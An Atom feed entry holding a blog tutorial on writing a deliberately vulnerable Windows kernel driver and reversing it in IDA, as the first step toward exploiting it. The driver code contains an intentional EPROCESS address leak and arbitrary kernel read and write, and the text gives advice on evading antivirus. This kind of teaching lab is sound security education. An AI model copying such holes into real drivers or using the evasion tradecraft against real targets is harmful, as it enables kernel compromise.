<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://apexpredator-infosec.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://apexpredator-infosec.github.io/" rel="alternate" type="text/html" /><updated>2026-01-16T19:38:56-05:00</updated><id>https://apexpredator-infosec.github.io/feed.xml</id><title type="html">ApexPredator’s Blog</title><subtitle>Blog for tutorials and research in Reverse Engineering binaries and malware, exploit developmet, and Window&apos;s Kernel Internals.  This is a work in progress and will likely be slow to populate. I will update as I hav etime.</subtitle><entry><title type="html">2026-01-16-Basic-Driver-Writing-and-Exploiting</title><link href="https://apexpredator-infosec.github.io/posts/2026/01/16/Basic-Driver-Writing-and-Exploiting.html" rel="alternate" type="text/html" title="2026-01-16-Basic-Driver-Writing-and-Exploiting" /><published>2026-01-16T16:24:00-05:00</published><updated>2026-01-16T16:24:00-05:00</updated><id>https://apexpredator-infosec.github.io/posts/2026/01/16/Basic-Driver-Writing-and-Exploiting</id><content type="html" xml:base="https://apexpredator-infosec.github.io/posts/2026/01/16/Basic-Driver-Writing-and-Exploiting.html"><![CDATA[<p>This blog post covers the basic fundamentals of writing a Windows kernel driver. We will then cover Reverse Engineering (RE) our simple driver to find vulnerabilities and then write a custom exploit for our driver. This post is meant to be a “beginner” or introductory level for Windows kernel-mode exploitation. We will first cover using the same HalDispatchTable hijack from my previous blog post to gain kernel-mode code execution <a href="https://apexpredator-infosec.github.io/posts/2025/12/12/Finding-A-Needle-In-A-KSTACK.html">Finding a Needle in a KSTACK</a>. I recommend reading that post first if you are new to kernel exploitation as I do not explain some of the structures as in depth as I do in that one. This demo requires ensuring that HVCI is disabled by removing the Hyper-V feature if it was installed. We will cover kernel-mode code execution with HVCI disabled first and then cover a Data Only attack to show that we can still achieve our objects when we have a read/write primitive if HVCI is enabled. You will need to enable test signing for the driver on the target VM. Secure Boot most be disabled to enabled test signing. You can find the Visual Studio solution and all source code on my GitHub <a href="https://github.com/ApexPredator-InfoSec/ASSVD_demo">ASSVD_demo</a>.</p>

<p><img src="/assets/images/post3-HVCI-off.png" alt="post3-HVCI-off.png" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bcdedit -set TESTSIGNING ON
</code></pre></div></div>

<p><img src="/assets/images/post3-bcdedit-testsigning.png" alt="post3-bcdedit-testsigning.png" /></p>

<p>The demo Virtual Machines (VM) are built with Windows 11 Professional 25H2 with Windows Defender Anti-Virus (AV). This is the latest version of Windows available at the time of writing this post. Windows Defender did not detect the exploit during the iterative development process until the very end. It required a very trivial bypass to evade detection which will be covered in this blog. Windows Defender is not as robust as Microsoft Defender for Endpoint (MDE), but it does have cloud scanning which can improve its chances of detection. It is not recommended to develop your exploits on machines that have internet connected AVs as it can lead to your exploit getting burned. I recommend testing your exploits against the AV systems used by your targets on offline machines with updated signatures. It does not matter for this scenario though as we are using a custom written driver and exploit that I have already posted on GitHub, so it’s only a matter of time before the driver and exploit are detected as malicious.</p>

<p>Please refer to my previous blog on how to setup Windows kernel debugging in Windows 11 25H2 to help setup your lab <a href="https://apexpredator-infosec.github.io/posts/2025/12/01/kernel-debugging-walk-through.html">Windows Kernel Debugging</a>. I use my debugger as my development system. I have installed Visual Studio 2022 Professional for writing the driver and the exploit. At the time of this writing Visual Studio 2026 has some quirks that fail to build kernel drivers.  Install the Desktop Development with C++ workload in the Visual Studio installer. You will also need the Windows Driver Kit component, latest C++ ATL with spectre mitigation, and MSVC v143 C++ x86/x64 with spectre mitigation in your Visual Studio 2022 setup.</p>

<p><img src="/assets/images/post3-visua-studio-install.png" alt="post3-visua-studio-install.png" /></p>

<p>Open Visual Studio 2022 after installation is complete to begin writing the kernel driver. Create a new project and select the Kernel Mode Driver, Empty (KMDF) template.</p>

<p><img src="/assets/images/post3-visual-studi-create-project.png" alt="post3-visual-studi-create-project.png" /></p>

<p>I named the driver ApexDriver and refer to it on GitHub as Apex Stupidly Simple Vulnerable Driver. You can name the driver whatever you want, just remember to change the name in the source code if you pick a different name than I did.  I usually check the box to store the solution and project in the same directory, but this time I leave it unchecked as we will add both the driver and the exploit as projects in the same solution. It is really a matter of personal preference and I feel it is more organized on single project solutions to store it all in one folder. I also feel it’s more organized to create both the driver and exploits as separate projects in one solution for a demo like this one. You can go with whatever method you feel is more organized for you.</p>

<p><img src="/assets/images/post3-visual-studio-configure-project-1.png" alt="post3-visual-studio-configure-project-1.png" /></p>

<p>Click create to create the solution and project. Right click on the project once the Visual Studio IDE opens and select Add new Item. Add an item named ApexDriver.c or whatever you named it. Use .c instead of the default .cpp.</p>

<p><img src="/assets/images/post3-visual-studio-add-new.png" alt="post3-visual-studio-add-new.png" /></p>

<p>We then add the following C code. I will break it down in to chunks and explain each part. The first part includes the Ntifs.h and ntddk.h headers. The Ntifs header is needed for a call to PsLookupProcessByProcessId further down. It is used by Windows file system and filter driver developers enabling interaction with the Windows file system through the driver <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/">Ntifs</a>. The ntddk header contains many of the functions, structures, and enums used by kernel-mode drivers and is included by default when selecting the Kernel Mode Driver empty template <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/">ntddk</a>. We actually aren’t using anything from this header in our super simple driver so we could actually comment it out if we wanted to. We the define our Input/Output Control Codes (IOCTL). We set our name for the IOCTL and the CTL_CODE which is the 32-bit IOCTL code that will be used to communicate with the driver for that particular function. The 32-bit IOCTL is calculated based off of the device type, the function, the method, and the access. We set the IOCTL to the unknown device type, set the function to a value between 0x800 and 0xfff for vendor controlled functions, communication method buffered, and grant it read and write access with FILE_ANY_ACCESS <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes">Define IOCTLs</a>.</p>

<pre><code class="language-C">#include &lt;Ntifs.h&gt;
#include &lt;ntddk.h&gt;

#define IOCTL_LEAK_EPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0xdff, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_QWORD CTL_CODE(FILE_DEVICE_UNKNOWN, 0xf00, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_QWORD CTL_CODE(FILE_DEVICE_UNKNOWN, 0xf01, METHOD_BUFFERED, FILE_ANY_ACCESS)
</code></pre>

<p>We then define the functions DriverUnload and CompleteIrp. The DriverUnload function allows us to gracefully unload the driver by calling IoDeleteSymbolicLink and IoDeleteDevice passing the driver device object and the symbolic link that we create later in the code to load the driver.  The CompleteIrp function  completes the I/O request sent from user-mode via the IOCTLs. It uses the I/O Request Packet (IRP) structure and sets the NTSTATUS to define success or ERROR code for the I/O request. It also sets the Information field in the IRP to tell the system if there is data to return to the user. It then calls IoCompleteRequest to complete the request and return back to user-mode. We will go over the IRP structure in more detail after the driver code explanation is finished.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">VOID</span> <span class="nf">DriverUnload</span><span class="p">(</span><span class="n">_In_</span> <span class="n">PDRIVER_OBJECT</span> <span class="n">DriverObject</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">UNICODE_STRING</span> <span class="n">SymLink</span> <span class="o">=</span> <span class="n">RTL_CONSTANT_STRING</span><span class="p">(</span><span class="s">L"</span><span class="se">\\</span><span class="s">??</span><span class="se">\\</span><span class="s">ApexDriver"</span><span class="p">);</span>
    <span class="n">IoDeleteSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SymLink</span><span class="p">);</span>
    <span class="n">IoDeleteDevice</span><span class="p">(</span><span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DeviceObject</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">NTSTATUS</span> <span class="nf">CompleteIrp</span><span class="p">(</span><span class="n">PIRP</span> <span class="n">Irp</span><span class="p">,</span> <span class="n">NTSTATUS</span> <span class="n">ntStatus</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">info</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">ntStatus</span><span class="p">;</span>
    <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="n">info</span><span class="p">;</span>
    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ntStatus</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Next we define the DeviceIoControl function. This function defines what the driver actually does when it receives an I/O Request containing a valid IOCTL.  We pass the Device Object for the driver and the pointer to the IRP structure for the I/O Request received from user-mode. The function uses the macro UNREFERENCE_PARAMETER(DeviceObject) to silence any compiler warnings for not using the DeviceObject parameter as it is not needed in all IOCTL requests and we do not currently use it in any of our simple IOCTLs. It then sets the stack location using IoGetCurrentIrpStackLocation by passing the pointer to the IRP.  We then declare and set both the outBuf and inBuf variables pointed to the SystemBuffer. The names help us track which direction we are going, but they point to the same thing. The UserBuffer in the IRP gets set to the input buffer passed to the driver in user-mode  and then that input gets copied to the SystemBuffer (kernel-mode memory) in the IRP. The driver can then access the data sent from user-mode in the input buffer. It will then copy any output to the SystemBuffer that then gets copied to the UserBuffer to return to the user-mode caller.  The DeviceIoControl function  then will set the IoStatus.Information field in the IRP to equal the size of the SystemBuffer (outBuf) to tell the system how much data to return to user-mode.</p>

<p>We then have a switch statement to determine what action the driver takes based off of the IOCTL code. the IOCTL_LEAK_EPROCESS will check to ensure the OutputBuffer length is large enough to hold a QWORD.  It then takes the Proccess Identifier (PID) sent in the input buffer from user-mode and passes it to PsLookupProcessByProcessId(). The PsLookupProcessByProcessId() function takes the PID and returns the EPROCESS structure for the process.  See my previous blog post for more in depth explanation of the EPROCESS structure <a href="https://apexpredator-infosec.github.io/posts/2025/12/12/Finding-A-Needle-In-A-KSTACK.html">Finding a Needle In a KSTACK</a>.  The IOCTL_LEAK_EPROCESS then copies the kernel-mode address of the EPROCESS structure to the output buffer to return to user-mode giving us a KASLR bypass.  The next two IOCTL functions give us our read and write primitives.</p>

<p>IOCTL_READ_QWORD will take the address provided in the input buffer and read the QWORD at that address and return it to the user-mode caller. The IOCTL_WRITE_QWORD will take the address and QWORD provided in the input buffer by the user-mode caller and will write the provided QWORD to the provided address. These three function are very simple and you will likely not get lucky enough to find these vulnerabilities in the real world in such a straight forward manor. You will often have to look for out of bounds reads and writes or look for Kernel Pool (the kernel’s version of  dynamic heap memory) overflows and corruption to build the read and write primitives. Information leaks like our EPROCESS leak tend to be buried inside a function that performs other actions and then returns data it should not return to user-mode. The idea with this driver is to show the vulnerabilities in their simplest form to show a very basic level of how a driver is written and exploited. This then allows you to progress to more complex analysis and attacks. At the end of the DeviceIoControl function we also define the NTSTATUS code for an invalid IOCTL and then complete the I/O request.</p>

<pre><code class="language-C">NTSTATUS DeviceIoControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONGLONG* outBuf = (ULONGLONG*)Irp-&gt;AssociatedIrp.SystemBuffer;
    ULONGLONG* inBuf = (ULONGLONG*)Irp-&gt;AssociatedIrp.SystemBuffer;
	ULONG info =  sizeof(outBuf);

    switch (stack-&gt;Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_LEAK_EPROCESS:
        if (stack-&gt;Parameters.DeviceIoControl.OutputBufferLength &gt;= sizeof(ULONGLONG))
        {
            PEPROCESS eProcess;
            ULONGLONG pid = ((PULONGLONG)(inBuf))[0];
            status = PsLookupProcessByProcessId((HANDLE)pid, &amp;eProcess);
            if (status != 0)
            {
                break;
            }
            ULONGLONG eProcessAddr = eProcess;
            RtlCopyBytes(outBuf, &amp;eProcessAddr, sizeof(ULONGLONG));
        }
        break;

    case IOCTL_READ_QWORD:
        if (stack-&gt;Parameters.DeviceIoControl.OutputBufferLength &gt;= sizeof(ULONGLONG))
        {

            PULONGLONG where = ((PULONGLONG)(inBuf))[0];
            RtlCopyBytes(outBuf, where, sizeof(ULONGLONG));
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case IOCTL_WRITE_QWORD:
        if (stack-&gt;Parameters.DeviceIoControl.InputBufferLength &gt;= sizeof(ULONGLONG))
        {
            PULONGLONG where = ((PULONGLONG)(inBuf))[0];
            PULONGLONG what = ((PULONGLONG)((ULONGLONG)inBuf + 0x08))[0];
            RtlCopyBytes(where, &amp;what, sizeof(ULONGLONG));
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    CompleteIrp(Irp, status, info);
    return status;
}
</code></pre>

<p>The last chunk defines  the DriverCreateFileRoutine, DriverCloseHandleRoutine, DriverReadWriteRoutine, and DriverEntry functions. The DriverCreateFileRoutine function is required to be able to obtain a handle to the driver with the CreateFile API in user-mode. The DriverCloseHandleRoutine is needed to be able to close the handle to the driver when we are done with it in user-mode. The DriverReadWriteRoutine is needed when we call the CreateFile API  to obtain the handle to the driver from user-mode with the GENERIC_READ and GENERIC_WRITE permissions.  The DriverEntry function is called when the driver is loaded. It creates the Driver Object and the Symbolic Link for the driver passing the path and driver name. It then maps the driver functions to the MajorFunction field in the IRP structures sent with I/O Requests from user-mode.</p>

<pre><code class="language-C">NTSTATUS DriverCreateFileRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}
NTSTATUS DriverCloseHandleRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    return  CompleteIrp(Irp, STATUS_SUCCESS, 0);
}
NTSTATUS DriverReadWriteRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING DevName = RTL_CONSTANT_STRING(L"\\Device\\ApexDriver");
    UNICODE_STRING SymLink = RTL_CONSTANT_STRING(L"\\??\\ApexDriver");
    PDEVICE_OBJECT DeviceObject;

    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &amp;DevName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &amp;DeviceObject
    );

    if (!NT_SUCCESS(status))
        return status;

    IoCreateSymbolicLink(&amp;SymLink, &amp;DevName);

    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = DriverCreateFileRoutine;
    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = DriverCloseHandleRoutine;
    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;
    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = DriverReadWriteRoutine;
    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = DriverReadWriteRoutine;
    DriverObject-&gt;DriverUnload = DriverUnload;
    
    return STATUS_SUCCESS;
}

</code></pre>

<p>The I/O Request Packet (IRP) structure is a partially opaque structure that represents an I/O Request Packet <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP</a>. This means that Microsoft does not publicly document the entire structure. Microsoft does document the parts of the structure that are important to us right now in this simple example. You will see SystemBuffer at offset +0x018, UserBuffer at offset +0x70, and CurrentStackLocation at offset +0xB8 <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_IRP">Vergilius Project IRP</a>. This is the same as what is documented on the previously linked Microsoft IRP documentation but adds in the offsets for reference. The structure is basically all of the information needed to make an I/O Request to the driver bundled up in a neatly organized package.</p>

<pre><code class="language-C++">//0xd0 bytes (sizeof)
struct _IRP
{
    SHORT Type;                                                             //0x0
    USHORT Size;                                                            //0x2
    USHORT AllocationProcessorNumber;                                       //0x4
    USHORT Reserved1;                                                       //0x6
    struct _MDL* MdlAddress;                                                //0x8
    ULONG Flags;                                                            //0x10
    ULONG Reserved2;                                                        //0x14
    union
    {
        struct _IRP* MasterIrp;                                             //0x18
        LONG IrpCount;                                                      //0x18
        VOID* SystemBuffer;                                                 //0x18
    } AssociatedIrp;                                                        //0x18
    struct _LIST_ENTRY ThreadListEntry;                                     //0x20
    struct _IO_STATUS_BLOCK IoStatus;                                       //0x30
    CHAR RequestorMode;                                                     //0x40
    UCHAR PendingReturned;                                                  //0x41
    CHAR StackCount;                                                        //0x42
    CHAR CurrentLocation;                                                   //0x43
    UCHAR Cancel;                                                           //0x44
    UCHAR CancelIrql;                                                       //0x45
    CHAR ApcEnvironment;                                                    //0x46
    UCHAR AllocationFlags;                                                  //0x47
    union
    {
        struct _IO_STATUS_BLOCK* UserIosb;                                  //0x48
        VOID* IoRingContext;                                                //0x48
    };
    struct _KEVENT* UserEvent;                                              //0x50
    union
    {
        struct
        {
            union
            {
                VOID (*UserApcRoutine)(VOID* arg1, struct _IO_STATUS_BLOCK* arg2, ULONG arg3); //0x58
                VOID* IssuingProcess;                                       //0x58
            };
            union
            {
                VOID* UserApcContext;                                       //0x60
                struct _IORING_OBJECT* IoRing;                              //0x60
            };
        } AsynchronousParameters;                                           //0x58
        union _LARGE_INTEGER AllocationSize;                                //0x58
    } Overlay;                                                              //0x58
    VOID (*CancelRoutine)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);  //0x68
    VOID* UserBuffer;                                                       //0x70
    union
    {
        struct
        {
            union
            {
                struct _KDEVICE_QUEUE_ENTRY DeviceQueueEntry;               //0x78
                VOID* DriverContext[4];                                     //0x78
            };
            struct _ETHREAD* Thread;                                        //0x98
            CHAR* AuxiliaryBuffer;                                          //0xa0
            struct _LIST_ENTRY ListEntry;                                   //0xa8
            union
            {
                struct _IO_STACK_LOCATION* CurrentStackLocation;            //0xb8
                ULONG PacketType;                                           //0xb8
            };
            struct _FILE_OBJECT* OriginalFileObject;                        //0xc0
            VOID* IrpExtension;                                             //0xc8
        } Overlay;                                                          //0x78
        struct _KAPC Apc;                                                   //0x78
        VOID* CompletionKey;                                                //0x78
    } Tail;                                                                 //0x78
}; 
</code></pre>

<p>This is an example of an IRP sent during a call to the driver. We can see that the SystemBuffer that will be used to copy our data to the UserBuffer is at kernel-mode address 0xffff93858ead1c00. The UserBuffer is at user-mode address 0x000000001a001000, so we will be able to read what is copied there from the SystemBuffer. We also see that the CurrentStackLocation is 0xffff93858b625880. We will see this used when we debug our code to interact with the driver.  It also helps to know that CurrentStackLocation is stored at offset 0xB8 in the IRP when we RE the driver.  The IRP address is stored in RDX. We will see in the disassembly that the code moves the address located at RDX+0xB8 into R8. It will then move the value located at R8+0x18 in to ECX to begin the comparison to determine which IOCTL is being called. This can helps us verify we are in the right spot in IDA to find the valid IOCTLs for the driver.</p>

<pre><code class="language-C">struct _IRP, 25 elements, 0xd0 bytes
   +0x000 Type             : 0n6
   +0x002 Size             : 0x118
   +0x004 AllocationProcessorNumber : 5
   +0x006 Reserved1        : 0
   +0x008 MdlAddress       : (null) 
   +0x010 Flags            : 0x60070
   +0x014 Reserved2        : 0
   +0x018 AssociatedIrp    : union &lt;unnamed-tag&gt;, 3 elements, 0x8 bytes
      +0x000 MasterIrp        : 0xffff93858ead1c00 struct _IRP, 25 elements, 0xd0 bytes
         +0x000 Type             : 0n28672
         +0x002 Size             : 0xcc49
         +0x004 AllocationProcessorNumber : 0xf804
         +0x006 Reserved1        : 0xffff
         +0x008 MdlAddress       : (null) 
         +0x010 Flags            : 0
         +0x014 Reserved2        : 0
         +0x018 AssociatedIrp    : union &lt;unnamed-tag&gt;, 3 elements, 0x8 bytes
         +0x020 ThreadListEntry  : struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0x0000000000000000 - 0x0000000000000000 ]
         +0x030 IoStatus         : struct _IO_STATUS_BLOCK, 3 elements, 0x10 bytes
         +0x040 RequestorMode    : 0 ''
         +0x041 PendingReturned  : 0 ''
         +0x042 StackCount       : 0 ''
         +0x043 CurrentLocation  : 0 ''
         +0x044 Cancel           : 0 ''
         +0x045 CancelIrql       : 0 ''
         +0x046 ApcEnvironment   : 0 ''
         +0x047 AllocationFlags  : 0 ''
         +0x048 UserIosb         : (null) 
         +0x048 IoRingContext    : (null) 
         +0x050 UserEvent        : 0x2070634902060000 struct _KEVENT, 1 elements, 0x18 bytes
         +0x058 Overlay          : union &lt;unnamed-tag&gt;, 2 elements, 0x10 bytes
         +0x068 CancelRoutine    : (null) 
         +0x070 UserBuffer       : 0x0000000000000004 Void
         +0x078 Tail             : union &lt;unnamed-tag&gt;, 3 elements, 0x58 bytes
      +0x000 IrpCount         : 0n-1901257728
      +0x000 SystemBuffer     : 0xffff93858ead1c00 Void
   +0x020 ThreadListEntry  : struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858db685c0 - 0xffff93858db685c0 ]
      +0x000 Flink            : 0xffff93858db685c0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858b6257d0 - 0xffff93858b6257d0 ]
         +0x000 Flink            : 0xffff93858b6257d0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858db685c0 - 0xffff93858db685c0 ]
         +0x008 Blink            : 0xffff93858b6257d0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858db685c0 - 0xffff93858db685c0 ]
      +0x008 Blink            : 0xffff93858db685c0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858b6257d0 - 0xffff93858b6257d0 ]
         +0x000 Flink            : 0xffff93858b6257d0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858db685c0 - 0xffff93858db685c0 ]
         +0x008 Blink            : 0xffff93858b6257d0 struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0xffff93858db685c0 - 0xffff93858db685c0 ]
   +0x030 IoStatus         : struct _IO_STATUS_BLOCK, 3 elements, 0x10 bytes
      +0x000 Status           : 0n0
      +0x000 Pointer          : (null) 
      +0x008 Information      : 0
   +0x040 RequestorMode    : 1 ''
   +0x041 PendingReturned  : 0 ''
   +0x042 StackCount       : 1 ''
   +0x043 CurrentLocation  : 1 ''
   +0x044 Cancel           : 0 ''
   +0x045 CancelIrql       : 0 ''
   +0x046 ApcEnvironment   : 0 ''
   +0x047 AllocationFlags  : 0x6 ''
   +0x048 UserIosb         : 0x000000687f4ffb40 struct _IO_STATUS_BLOCK, 3 elements, 0x10 bytes
      +0x000 Status           : 0n0
      +0x000 Pointer          : (null) 
      +0x008 Information      : 0
   +0x048 IoRingContext    : 0x000000687f4ffb40 Void
   +0x050 UserEvent        : (null) 
   +0x058 Overlay          : union &lt;unnamed-tag&gt;, 2 elements, 0x10 bytes
      +0x000 AsynchronousParameters : struct &lt;unnamed-tag&gt;, 4 elements, 0x10 bytes
         +0x000 UserApcRoutine   : (null) 
         +0x000 IssuingProcess   : (null) 
         +0x008 UserApcContext   : (null) 
         +0x008 IoRing           : (null) 
      +0x000 AllocationSize   : union _LARGE_INTEGER, 4 elements, 0x8 bytes
 0x0
         +0x000 LowPart          : 0
         +0x004 HighPart         : 0n0
         +0x000 u                : struct &lt;unnamed-tag&gt;, 2 elements, 0x8 bytes
         +0x000 QuadPart         : 0n0
   +0x068 CancelRoutine    : (null) 
   +0x070 UserBuffer       : 0x000000001a001000 Void
   +0x078 Tail             : union &lt;unnamed-tag&gt;, 3 elements, 0x58 bytes
      +0x000 Overlay          : struct &lt;unnamed-tag&gt;, 9 elements, 0x58 bytes
         +0x000 DeviceQueueEntry : struct _KDEVICE_QUEUE_ENTRY, 3 elements, 0x18 bytes
         +0x000 DriverContext    : [4] (null) 
         +0x020 Thread           : 0xffff93858db68080 struct _ETHREAD, 149 elements, 0x798 bytes
         +0x028 AuxiliaryBuffer  : (null) 
         +0x030 ListEntry        : struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0x0000000000000000 - 0x0000000000000000 ]
         +0x040 CurrentStackLocation : 0xffff93858b625880 struct _IO_STACK_LOCATION, 9 elements, 0x48 bytes
         +0x040 PacketType       : 0x8b625880
         +0x048 OriginalFileObject : 0xffff93858588d130 struct _FILE_OBJECT, 30 elements, 0xd8 bytes
         +0x050 IrpExtension     : (null) 
      +0x000 Apc              : struct _KAPC, 19 elements, 0x58 bytes
         +0x000 Type             : 0 ''
         +0x001 AllFlags         : 0 ''
         +0x001 CallbackDataContext : Bitfield 0y0
         +0x001 Unused           : Bitfield 0y0000000 (0)
         +0x002 Size             : 0 ''
         +0x003 SpareByte1       : 0 ''
         +0x004 SpareLong0       : 0
         +0x008 Thread           : (null) 
         +0x010 ApcListEntry     : struct _LIST_ENTRY, 2 elements, 0x10 bytes
 [ 0x0000000000000000 - 0x0000000000000000 ]
         +0x020 KernelRoutine    : 0xffff93858db68080           void  +ffff93858db68080
         +0x028 RundownRoutine   : (null) 
         +0x030 NormalRoutine    : (null) 
         +0x020 Reserved         : [3] 0xffff93858db68080 Void
         +0x038 NormalContext    : (null) 
         +0x040 SystemArgument1  : 0xffff93858b625880 Void
         +0x048 SystemArgument2  : 0xffff93858588d130 Void
         +0x050 ApcStateIndex    : 0 ''
         +0x051 ApcMode          : 0 ''
         +0x052 Inserted         : 0 ''
      +0x000 CompletionKey    : (null) 

</code></pre>

<p>Begin RE of the driver by opening it in IDA, Ghidra, or Binary Ninja. I will be using IDA for this demo. The IDA Free version is available on the Hex-Rays website, it does require creating a free account <a href="https://hex-rays.com/ida-free">Hex-Rays</a>. Double click the DriverEntry subroutine in IDA and you will see a call to two subroutines. Offsets can change when recompiling so your offsets may be different than shown. you can still easily correlate to the correct section of the code.</p>

<p><img src="/assets/images/post3-ida-driver-entry.png" alt="post3-ida-driver-entry.png" /></p>

<p>Double click the second subroutine call to go to the subroutine at offset 0x129C. There you will see a call to RtlCopyUnicodeString in the second code block that is taken if the result of the test rcx, rcx in the first code block is not zero. If you scroll down you will see comments for driver load failed. If we double click the red line to jump to the branch executed if the test rcx, rcx is zero we will see a call to a subroutine at offset 0x10E8.</p>

<p><img src="/assets/images/post3-ida-sub129c.png" alt="post3-ida-sub129c.png" /></p>

<p><img src="/assets/images/post3-ida-sub129c-2.png" alt="post3-ida-sub129c-2.png" /></p>

<p>Double click the call to the subroutine at offset 0x10E8. We see that the subroutine creates the device name and the symbolic name with calls to IoCreateDevice and IoCreateSymbolicLink. We also see the strings for the device name and symbolic link in the first code block. We will use the device name in our exploit code to open a handle to the driver with the CreateFile API.</p>

<p><img src="/assets/images/post3-ida-sub10e8.png" alt="post3-ida-sub10e8.png" /></p>

<p>Switch to the debugger and type the command using the name of the driver:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!drvobj ApexDriver 2
</code></pre></div></div>

<p>This will show the addresses to the major functions of the driver. We will see the IRP_MJ_CREATE, IRP_MJ_CLOSE. IRP_MJ_READ, IRP_MJ_WRITE, and IRP_MJ_DEVICE_CONTROL that we created and linked in the driver code. We will communicate with the driver using IOCTLs. The IOCTLs are defined in the IRP_MJ_DEVICE_CONTROL function which we can see is at offset 0x1000.</p>

<p><img src="/assets/images/post3-windbg-drvobj.png" alt="post3-windbg-drvobj.png" /></p>

<p>Switch back to IDA and navigate to the subroutine at offset 0x1000. We can see in the function prologue that the current stack location is moved in to r8 via the mov r8, [rdx+b8h] instruction. We then can see the IOCTL that was sent is moved in to ecx with the mov ecx, [r8+18h] instruction. We also see that that the SystemBuffer is moved into rdi with the mov rdi, [rdx+18h] instruction. The IRP is also moved in to rsi with the mov rsi, rdx instruction. The first IOCTL is 0x2237FC. We can tell this by the sub ecx, 2237FCh instruction followed by a jump zero. When the result is zero it then checks that the output buffer (SystemBuffer) length is at least 8 bytes wit the cmp dword ptr [r8+8], 8.  the code will jump to the prologue when the output buffer is less that 8 bytes and will jump to the code blocks for the 0x2237FC IOCTL when the output buffer is at least 8 bytes.</p>

<p><img src="/assets/images/post3-ida-sub1000.png" alt="post3-ida-sub1000.png" /></p>

<p>IDA helpfully places some inline comments to tell us that rcx is loaded with the ProcessID and the address of the address that will hold the EPROCESS pointer is loaded in to rdx. We can also look up the parameters on the Microsoft site <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid">PsLookupProcessByProcessId</a>. We know that the ProcessId is provided by the user-mode caller because it is pulled from the SystemBuffer stored in rdi. The code block calls PsLookupProcessByProcessId and then tests to make sure it was successful. The eax register will be 0 for NTSTATUS_SUCCESS if the call was successful and will contain an error code if it failed. We then see the address of the EPROCESS structure is moved in to rcx with the mov rcx, [rsp+28h+Process] instruction. The EPROCESS is then copied in to the SystemBuffer with the mov [rdi], rcx instruction.</p>

<p><img src="/assets/images/post3-ida-sub1000-2.png" alt="post3-ida-sub1000-2.png" /></p>

